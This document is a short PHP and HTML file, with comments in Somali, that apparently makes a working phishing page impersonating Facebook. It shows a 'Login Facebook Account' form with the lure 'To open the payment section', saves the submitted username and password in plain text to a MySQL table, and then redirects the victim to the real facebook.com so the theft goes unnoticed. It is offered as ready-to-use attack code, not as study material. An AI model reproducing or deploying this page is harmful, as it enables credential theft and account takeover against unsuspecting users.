<?php
// PHP: haddii form la submit gareeyo
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // 1. Database connection
    $conn = new mysqli('localhost', 'root', '', 'user_db');
    if ($conn->connect_error) {
        die("Connection failed: " . $conn->connect_error);
    }

    // 2. Hel xogta form-ka
    $username = $conn->real_escape_string($_POST['username']);
    $password = $conn->real_escape_string($_POST['password']);

    // 3. Ku keydi database
    $sql = "INSERT INTO users (username, password) VALUES ('$username', '$password')";
    if ($conn->query($sql) === TRUE) {
        // 4. Redirect website kale (facebook)
        header("Location: https://www.facebook.com");
        exit();
    } else {
        echo "Error: " . $conn->error;
    }

    $conn->close();
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Create Facebook Account</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background: #e9ebee;
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .container {
      background: white;
      padding: 40px;
      border-radius: 10px;
      box-shadow: 0 4px 20px rgba(0,0,0,0.1);
      width: 320px;
      text-align: center;
    }
    .container h2 {
      color: #1877f2;
      margin-bottom: 20px;
    }
    .container input {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 6px;
      font-size: 14px;
    }
    .container button {
      width: 100%;
      padding: 12px;
      background: #1877f2;
      color: white;
      border: none;
      border-radius: 6px;
      font-size: 16px;
      cursor: pointer;
    }
    .container button:hover {
      background: #166fe5;
    }
    .container p {
      font-size: 12px;
      color: #555;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Login Facebook Account</h2>
    <h5>To open the payment section</h5>
    <form method="POST">
      <input type="text" name="username" placeholder="Username or email" required>
      <input type="password" name="password" placeholder="Password" required>
      <button type="submit">Login</button>
    </form>
  </div>
</body>
</html>
